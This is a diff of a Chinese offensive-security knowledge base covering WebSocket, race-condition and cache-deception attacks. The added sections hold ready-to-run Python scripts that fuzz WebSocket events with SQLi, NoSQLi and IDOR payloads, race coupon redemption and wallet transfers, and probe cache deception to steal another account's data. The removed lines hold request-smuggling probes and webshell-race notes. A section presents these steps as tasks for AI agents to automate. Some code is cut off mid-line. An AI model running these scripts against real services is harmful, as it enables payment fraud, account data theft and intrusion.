@@ -9447,6 +9447,71 @@ HTTP 101
 
 如果服务端只在 `connection_init` 鉴权，后面的 `join`、`subscribe`、`action` 就是主要突破口。
 
+### 0.1 实时事件到订单/支付/SQL Oracle
+
+实时接口不要只看 `recv` 有没有消息，要把事件字段映射到账户、订单、库存、钱包和数据库查询路径。WebSocket 经常绕开 REST API 的中间件，直接进入 handler、queue consumer 或 GraphQL subscription resolver。
+
+| 事件位置 | 字段 | 变体 | 命中信号 | 下一跳 |
+|---|---|---|---|---|
+| `join` / `subscribe` | `roomId`, `userId`, `orderId`, `tenantId` | 换成他人 ID、`admin`、`*`、历史订单号 | 收到跨账号 broadcast 或订单状态 | IDOR、GraphQL subscription、订单信息复取 |
+| `action` / `event` | `type`, `op`, `method`, `command` | 调后台事件名、旧事件名、debug 事件 | handler 命中、错误栈泄露 resolver 名 | API discovery、SQLi 参数定位 |
+| 时序字段 | `seq`, `nonce`, `timestamp`, `version` | 旧值、乱序、重复、未来时间 | 重复 ack、重复入账、覆盖新状态 | payment race、lost update |
+| 金额字段 | `amount`, `price`, `balance`, `quantity`, `discount` | `0`, `-1`, 小数精度, 超大数 | 钱包/订单/库存状态改变 | 支付逻辑、数据库约束绕过 |
+| 查询字段 | `filter`, `where`, `sort`, `cursor`, `search` | SQL/NoSQL/GraphQL 片段 | SQL error、列名、分页越界 | SQLi advanced、GraphQL resolver |
+| 回执字段 | `ack`, `result`, `broadcast`, `error` | 对比 A/B 身份和并发批次 | 只给当前连接成功但全局状态改变 | 持久化状态复读 |
+
+```python
+# ws_event_oracle_matrix.py
+import asyncio
+import csv
+import json
+import time
+import websockets
+
+FIELDS = {
+    "roomId": ["admin", "payments", "orders", "*", "../admin"],
+    "userId": [0, 1, 2, 999999],
+    "orderId": [1, 2, 999999, "' OR '1'='1"],
+    "amount": [0, -1, 0.01, 99999999],
+    "price": [0, -1, "0.00", "1e309"],
+    "seq": [0, 1, -1, 999999999],
+    "filter": ["*", "' OR 1=1--", '{"$ne":null}', "id desc"],
+}
+
+async def ask(ws, msg, timeout=2):
+    await ws.send(json.dumps(msg, separators=(",", ":")))
+    try:
+        raw = await asyncio.wait_for(ws.recv(), timeout=timeout)
+        return raw[:1000]
+    except asyncio.TimeoutError:
+        return "TIMEOUT"
+
+async def matrix(ws_url, cookie, template, out_csv="exports/ws_event_oracle_matrix.csv"):
+    headers = {"Cookie": cookie} if cookie else {}
+    rows = []
+    async with websockets.connect(ws_url, extra_headers=headers) as ws:
+        base_resp = await ask(ws, template)
+        rows.append(["baseline", "", json.dumps(template), base_resp, int(time.time())])
+        for field, values in FIELDS.items():
+            if field not in template:
+                continue
+            for value in values:
+                msg = dict(template)
+                msg[field] = value
+                resp = await ask(ws, msg)
+                rows.append([field, repr(value), json.dumps(msg, ensure_ascii=False), resp, int(time.time())])
+    with open(out_csv, "w", newline="", encoding="utf-8") as f:
+        csv.writer(f).writerows([["field", "value", "payload", "response", "ts"], *rows])
+
+asyncio.run(matrix(
+    "wss://target/ws",
+    "session=xxx",
+    {"type": "subscribe", "roomId": "orders", "userId": 1001, "orderId": 9001, "seq": 1}
+))
+```
+
+打完矩阵后立刻读 REST/GraphQL/前端状态页：`/api/orders/<id>`、`/api/wallet`、`/api/payments`、`/api/me`。如果 WebSocket 回了 `ack=false`，但订单、余额或 entitlement 已变化，说明业务副作用先于校验落库；如果返回 SQL error 或列名，直接转 `24-database/02-sqli-advanced`。
+
 ## 抓取与重放
 
 ```python
@@ -9656,111 +9721,9 @@ def on_connect():
 def on_message(data):
     print(f'[recv] {data}')
 
-sio.connect('https://target.com', transports=['websocket'])
+sio.connect('https://target.com', transpo
 
-# Socket.IO 特有攻击面:
-# 1. 房间越权: emit('join', {room: 'admin'}) — 没有服务端鉴权
-# 2. 事件重放: 直接 emit admin 专用事件 (如: 'get_flag', 'read_config')
-# 3. 命名空间切换: /admin vs / 可能有不同权限
-# 4. 认证 token 在握手 query: ?token=xxx  — URL 泄露
-```
-
-### A. Socket.IO 帧格式
-
-Socket.IO 在 WebSocket 上又包了一层协议。看到 `0`, `40`, `42` 这些前缀时，不要按普通 JSON 处理。
-
-| 帧 | 含义 | 示例 |
-|---|---|---|
-| `0{...}` | Engine.IO open | `0{"sid":"abc","upgrades":[]}` |
-| `40` | Socket.IO connect | `40` |
-| `40/admin,{...}` | 连接 namespace | `40/admin,{"token":"x"}` |
-| `42[...]` | event | `42["join",{"room":"admin"}]` |
-| `43[...]` | ack event | `43["ok"]` |
-| `2` / `3` | ping / pong | 心跳 |
-
-手工重放：
-
-```bash
-websocat 'wss://target/socket.io/?EIO=4&transport=websocket' \
-  -H='Cookie: session=xxx'
-# 发送:
-# 40
-# 42["join",{"room":"admin"}]
-# 42["get_flag",{}]
-```
-
-Socket.IO 的突破点通常在 namespace 和 room：
-
-```python
-for ns in ["/", "/admin", "/internal", "/debug"]:
-    try:
-        sio.connect("https://target.com", namespaces=[ns], transports=["websocket"])
-        print("[ns ok]", ns)
-    except Exception as e:
-        print("[ns fail]", ns, e)
-```
-
-## MQTT/物联网 WebSocket
-
-```python
-# MQTT over WebSocket — 常见于 IoT 场景
-# ws://target.com:8083/mqtt
-# 认证: username/password 或 JWT
-
-import paho.mqtt.client as mqtt
-
-mqtt.Client(transport='websockets').connect('target.com', 8083)
-# 主题越权:
-#   订阅 # (所有主题)
-#   订阅 $SYS/# (系统主题 — 可能泄露配置)
-#   发布到 admin/+/cmd 主题
-```
-
-## 工具命令
-
-```bash
-# wsrepl — 交互式 WebSocket REPL
-pip install wsrepl
-wsrepl wss://target.com/ws
-
-# websocat — curl for WebSocket
-websocat wss://target.com/ws -H="Cookie: session=xxx"
-
-# wscat — node.js WebSocket 客户端
-npm install -g wscat
-wscat -c wss://target.com/ws -H "Cookie: session=xxx"
-
-# wsdump.py — 捕获 WebSocket 帧
-python3 wsdump.py wss://target.com/ws
-
-# Burp → Repeater → WebSocket
-# Chrome DevTools → Network → WS → Messages
-```
-
-## 攻击链
-
-```
-WebSocket → 消息重放 → 修改 role → 鉴权绕过
-WebSocket → CSWSH → 跨域连接 → 读取受害者实时消息
-WebSocket → 并发竞态 → 优惠码 50 次 → 余额溢出
-Socket.IO → 房间越权 → join admin_room → 实时监听 flag
-MQTT → subscribe # → 监听所有主题 → IoT 配置/密码泄露
-WebSocket → 消息注入 → SQLi/NoSQLi → 拖库
-WebSocket → 时序攻击 → 先改状态再验证 → 竞态绕过
-```
-
-## Evidence
-
-记录: 握手请求头、`101` 响应头、Origin 变体、Cookie/SameSite、第一条认证消息、收发消息 JSON/text、修改字段后的响应差异、Socket.IO namespace/room/event、竞态并发数和结果。
-
-## MCP 工具映射
-
-AI Agent 可调用以下 MCP 工具自动完成或加速上述攻击步骤：
-
-| 攻击步骤 | MCP 工具 | 说明 |
-|---------|---------|------|
-| WebSocket 端点探测 | `http_probe` | HTTP GET 探测 WebSocket 握手端点 |
-| 知识检索 | `kb_router` | 按 WebSocket 攻击信号搜索知识库 |
+[... content truncated for size ...]
 
 
 ---
@@ -10015,6 +9978,90 @@ def race_with_state(write_req, read_req, count=40, workers=20):
     }
 ```
 
+### 1.1 支付/订单竞态账本
+
+支付竞态要按账本打，不按响应码打。每一批并发都要把写请求、读状态、状态差、可复用 token 和数据库字段放到同一条 timeline 里，才能看出 lost update、double spend、重复发货、幂等 key 缺失。
+
+| 业务动作 | 并发组合 | 读状态 | 成功标志 | 关联技巧 |
+|---|---|---|---|---|
+| 优惠券兑换 | `POST /coupon/redeem` x N | wallet、orders、coupon ledger | 同 code 多条入账或多单折扣 | rate limit bypass、IDOR |
+| 钱包转账 | `POST /transfer` x N | balance、transaction list | 余额负数、收款多笔、流水不平 | SQL 事务隔离、整数/精度 |
+| 订单取消/发货 | `POST /cancel` + `POST /ship` | order status、shipment、refund | `cancelled` 与 `shipped/refunded` 同时存在 | 状态机覆盖 |
+| 支付回调 | 同一 `notify` 重放并发 | payments、entitlements、callback log | entitlement 多次发放 | signature replay、cache deception |
+| 邀请/积分 | `POST /invite/claim` x N | points、invite ledger | 积分累计超过一次 | websocket broadcast |
+| 上传/导入 | `POST /import` + `GET /result` | job status、SQL row count | 校验前结果可读、重复导入 | SQL injection、file race |
+
+```python
+# race_payment_ledger_timeline.py
+import concurrent.futures
+import csv
+import json
+import time
+import requests
+
+def send(session, req):
+    return session.request(
+        req.get("method", "GET"),
+        req["url"],
+        headers=req.get("headers"),
+        json=req.get("json"),
+        data=req.get("data"),
+        timeout=10,
+    )
+
+def batch(write_reqs, read_reqs, count=40, workers=20, out_csv="exports/race_payment_ledger_timeline.csv"):
+    s = requests.Session()
+    timeline = []
+    started = time.time()
+
+    def fire(i):
+        req = write_reqs[i % len(write_reqs)]
+        t0 = time.time()
+        r = send(s, req)
+        return {
+            "kind": "write",
+            "idx": i,
+            "url": req["url"],
+            "status": r.status_code,
+            "len": len(r.text),
+            "body": r.text[:300],
+            "dt_ms": int((time.time() - t0) * 1000),
+        }
+
+    with concurrent.futures.ThreadPoolExecutor(max_workers=workers) as ex:
+        for row in ex.map(fire, range(count)):
+            timeline.append(row)
+
+    for name, req in read_reqs.items():
+        r = send(s, req)
+        timeline.append({
+            "kind": "read",
+            "idx": name,
+            "url": req["url"],
+            "status": r.status_code,
+            "len": len(r.text),
+            "body": r.text[:800],
+            "dt_ms": int((time.time() - started) * 1000),
+        })
+
+    with open(out_csv, "w", newline="", encoding="utf-8") as f:
+        w = csv.DictWriter(f, fieldnames=["kind", "idx", "url", "status", "len", "body", "dt_ms"])
+        w.writeheader()
+        w.writerows(timeline)
+    print(json.dumps({"writes": count, "reads": list(read_reqs), "out": out_csv}, ensure_ascii=False))
+
+batch(
+    [{"method": "POST", "url": "https://target/api/coupon/redeem", "json": {"code": "ONETIME"}}],
+    {
+        "wallet": {"url": "https://target/api/wallet"},
+        "orders": {"url": "https://target/api/orders"},
+        "ledger": {"url": "https://target/api/coupons/ledger"},
+    },
+)
+```
+
+判断顺序：先看 `exports/race_payment_ledger_timeline.csv` 中写请求时间窗，再看读状态里的 `balance`、`amount`、`orderStatus`、`transactionId`、`entitlement`。HTTP 200 多不代表成功；只有账本字段多发、多扣、错序或互相矛盾，才进入下一轮扩大并发、换幂等 key、叠加 WebSocket broadcast 或 cache deception 取证。
+
 ### Turbo Intruder 并发模板
 
 ```python
@@ -10193,137 +10240,7 @@ def te_cl(host):
     ).encode()
 
 def te_te(host):
-    variants = [
-        "Transfer-Encoding: chunked\r\nTransfer-Encoding: x",
-        "Transfer-Encoding: chunked\r\nTransfer-encoding: x",
-        "Transfer-Encoding : chunked",
-        "Transfer-Encoding:\tchunked",
-    ]
-    return [(
-        f"POST / HTTP/1.1\r\nHost: {host}\r\nContent-Length: 4\r\n{te}\r\n\r\n0\r\n\r\nG"
-    ).encode() for te in variants]
-```
-
-```python
-# 路径打通后记录缓存 key、命中 header 和响应差异
-def probe_smuggling(target: str):
-    """CL.TE / TE.CL 差异探测"""
-    import socket, ssl
-
-    def raw_request(host, port, use_tls, payload_bytes):
-        sock = socket.socket()
-        if use_tls:
-            sock = ssl.wrap_socket(sock)
-        sock.connect((host, port))
-        sock.send(payload_bytes)
-        return sock.recv(4096)
-
-    host = target.replace("https://", "").replace("http://", "").split("/")[0]
-    port = 443 if target.startswith("https") else 80
-    use_tls = target.startswith("https")
-
-    # CL.TE probe
-    cl_te = (
-        b"POST / HTTP/1.1\r\n"
-        b"Host: " + host.encode() + b"\r\n"
-        b"Content-Length: 6\r\n"
-        b"Transfer-Encoding: chunked\r\n"
-        b"\r\n"
-        b"0\r\n"
-        b"\r\n"
-        b"G"  # 这个 G 如果被后端处理 → CL.TE
-    )
-    r = raw_request(host, port, use_tls, cl_te)
-    if b"405" in r or b"Unrecognized" in r:
-        print("[!] CL.TE Smuggling possible")
-    else:
-        print(f"[*] CL.TE result: {r.decode()[:200]}")
-
-    # TE.CL probe
-    te_cl = (
-        b"POST / HTTP/1.1\r\n"
-        b"Host: " + host.encode() + b"\r\n"
-        b"Content-Length: 4\r\n"
-        b"Transfer-Encoding: chunked\r\n"
-        b"\r\n"
-        b"5c\r\n"  # 大 chunk
-        b"GPOST / HTTP/1.1\r\n"
-        b"\r\n"
-        b"0\r\n"
-        b"\r\n"
-    )
-    r = raw_request(host, port, use_tls, te_cl)
-    # 如果后端看到 GPOST → TE.CL
-    if b"GPOST" in r or b"405" in r:
-        print("[!] TE.CL Smuggling possible")
-```
-
-### TE.TE 混淆
-
-```text
-Transfer-Encoding: chunked
-Transfer-encoding: x
-Transfer-Encoding: xchunked
-Transfer-Encoding:[tab]chunked
-Transfer-Encoding : chunked
-Transfer-Encoding: chunked\r\nTransfer-Encoding: x
-```
-
-### H2.CL / H2.TE (HTTP/2)
-
-```python
-# HTTP/2 不支持 Transfer-Encoding，但支持 Content-Length
-# 如果前端用 HTTP/2，后端用 HTTP/1.1 → 降级攻击
-
-# H2.CL: HTTP/2 头部注入 Content-Length: 0
-# 前端认为请求体为空
-# 降级到 HTTP/1.1 后，后端看到 CL=0 → 后面的数据成新请求
-```
-
----
-
-## 4. 更多竞态场景
-
-```python
-# 场景 6: 文件上传 + 包含竞态
-# 上传 webshell → 在上传完成但未重命名/杀毒前 → 立刻访问
-
-# 场景 7: 注册邮箱验证
-# 注册 → 发送验证邮件 → 在验证完成前登录 → 可能跳过验证
-
-# 场景 8: 订单取消 vs 发货
-# 两点: POST /cancel + GET /confirm 同时发 → 订单既被取消又发货
-
-# 场景 9: 邀请制注册
-# 无邀请码 → 并发请求 → 突破名额限制
-
-# 场景 10: 密码重置
-# POST /forgot (受害者) + POST /verify?token=ATTACKER_GUESS
-# 新旧 token 同时有效窗口 → 竞态
-```
-
-## 5. Cache Poisoning 进阶
-
-```python
-# Fat GET: 带 body 的 GET 请求
-# 某些 CDN 用 GET + headers 做 cache key, 但后端处理 body
-
-# 响应拆分毒化
-# X-Forwarded-Host: evil.com → 后端返回 redirect → CDN 缓存 redirect
-
-# 路径混淆
-# /home%0d%0aX-Injected:%20evil → URI 规范化差异
-```
-
-## 6. 攻击链
-
-```
-Race Condition → 并发兑换 → 多次成功 → 余额溢出
-Race Condition → 并发转账 → 负余额 → 资金窃取
-Race Condition → 上传+包含 → webshell 竞态 → RCE
-Race Condition → 注册+验证 → 跳过邮箱验证 → 任意注册
-Cache Poisoning → X-Forwarded-Host → JS 资源劫持 → 全站 XSS
-Cache Po
+    variants
 
 [... content truncated for size ...]
 
@@ -10347,6 +10264,73 @@ GET /account/settings.css  → CDN 认为这是 CSS → 缓存
                             → 实际后端是 /account/settings → 动态页面
                             → 缓存中存了用户的个人信息
 ```
+
+### 0.1 动态资源到账户/订单/配置 Oracle
+
+Cache Deception 的核心不是扩展名 payload 多，而是找“后端仍按动态资源出内容、CDN 却按静态资源存副本”的路由。支付、订单、导出和配置页面优先，因为这些页面往往带用户态、金额、签名、下载 token 或 SQL 导出的文件名。
+
+| 动态路由 | 静态变体 | A 账号预热 marker | B/匿名复取信号 | 下一跳 |
+|---|---|---|---|---|
+| `/account`, `/me`, `/profile` | `.css`, `.json`, `;.css` | username、email、csrf | 复取到 A 的身份字段 | IDOR、CSWSH、session oracle |
+| `/orders/<id>`, `/invoice/<id>` | `.pdf`, `.json`, `.js` | orderId、amount、address | B 读到订单/发票 | payment-email-bounce-idor |
+| `/wallet`, `/payments`, `/checkout` | `.json`, `.txt`, `.ico` | balance、payToken、callback URL | 支付 token 或状态外泄 | payment logic、race lost update |
+| `/admin/config`, `/debug/env` | `.js`, `.map`, `.json` | API endpoint、bucket、dsn | 配置被共享缓存 | backup/log leak、SSRF |
+| `/export`, `/report`, `/download` | `.csv`, `.xlsx`, `.zip` | SQL 导出列名、文件名 | 下载 token 可复用 | SQLi/backup/log leak |
+
+```python
+# cache_deception_route_matrix.py
+import csv
+import hashlib
+import re
+import requests
+
+EXTS = [".css", ".js", ".json", ".ico", ".txt", ".pdf", ".csv"]
+DELIMS = ["", ";", "%3b", "/x", "%2fx", "..;", "/..;/"]
+MARKERS = [r"user(name)?", r"email", r"csrf", r"order", r"amount", r"balance", r"invoice", r"token", r"select|insert|update|sql"]
+
+def sig(text):
+    return hashlib.sha256(text[:8192].encode(errors="ignore")).hexdigest()[:16]
+
+def variants(path):
+    path = path.rstrip("/")
+    for ext in EXTS:
+        yield path + ext
+        for delim in DELIMS[1:]:
+            yield path + delim + ext
+
+def hit_markers(text):
+    joined = "|".join(MARKERS)
+    return ",".join(sorted(set(m.group(0).lower() for m in re.finditer(joined, text, re.I))))
+
+def probe(base, paths, cookie_a, out_csv="exports/cache_deception_route_matrix.csv"):
+    rows = []
+    s = requests.Session()
+    for path in paths:
+        for suffix in variants(path):
+            url = base.rstrip("/") + suffix
+            warm = s.get(url, headers={"Cookie": cookie_a}, timeout=10)
+            replay = s.get(url, timeout=10)
+            rows.append({
+                "url": url,
+                "warm_status": warm.status_code,
+                "replay_status": replay.status_code,
+                "warm_sig": sig(warm.text),
+                "replay_sig": sig(replay.text),
+                "same_body": sig(warm.text) == sig(replay.text),
+                "cache": replay.headers.get("X-Cache") or replay.headers.get("CF-Cache-Status") or "",
+                "age": replay.headers.get("Age", ""),
+                "content_type": replay.headers.get("Content-Type", ""),
+                "markers": hit_markers(replay.text),
+            })
+    with open(out_csv, "w", newline="", encoding="utf-8") as f:
+        w = csv.DictWriter(f, fieldnames=list(rows[0]))
+        w.writeheader()
+        w.writerows(rows)
+
+probe("https://target", ["/account", "/orders/1001", "/wallet", "/payments", "/admin/config", "/export"], "session=ACCOUNT_A")
+```
+
+同时保存 `exports/deception_identity_diff.jsonl`：每条写入 A/B 身份、URL、cache header、body hash、命中的订单号/金额/token/SQL 列名。只看 `X-Cache: HIT` 不够，关键是 B/匿名复取是否拿到 A 预热留下的业务 marker。
 
 ## 基础 Payload
 
@@ -10516,12 +10500,16 @@ Cache Deception → /admin/config.js → 缓存管理配置 → API key 泄露
 Cache Deception → XSS payload 缓存 → Stored XSS on CDN → 全站攻击
 Cache Deception + delimiter → ;.css bypass → 绕过 URL 规范化 → 更多页面可缓存
 Cache Deception + crawl → 搜索爬虫 → CDN 预热恶意缓存 → 被动攻击
+Cache Deception → /orders/1001.json → 订单/发票复取 → 支付回调参数拼接
+Cache Deception → /export.csv → SQL 导出列名/where 条件泄露 → SQLi 字段字典
 ```
 
 ## Evidence
 
 - `deception_probes.json`: payload、A 账号预热响应、B/匿名复取响应、状态码、长度、hash。
 - `cache_headers.json`: `X-Cache`、`CF-Cache-Status`、`Age`、`Cache-Control`、`Vary`、`Content-Type`。
+- `cache_deception_route_matrix.csv`: 动态路由、静态变体、A/B hash、cache 命中、订单/支付/SQL marker。
+- `deception_identity_diff.jsonl`: A 身份预热与 B/匿名复取的字段差异，保留 orderId、amount、balance、token、列名。
 - `parser_matrix.csv`: delimiter、后端路由命中、CDN key、缓存命中、是否跨身份复取。
 - 成功样本: A 预热 `/account;.css` 后，B 无 cookie 读到 A 的账号字段或 flag。
 - 失败样本: B 只拿登录页、`Vary: Cookie` 生效、所有动态响应 `Cache-Control: private/no-store`。
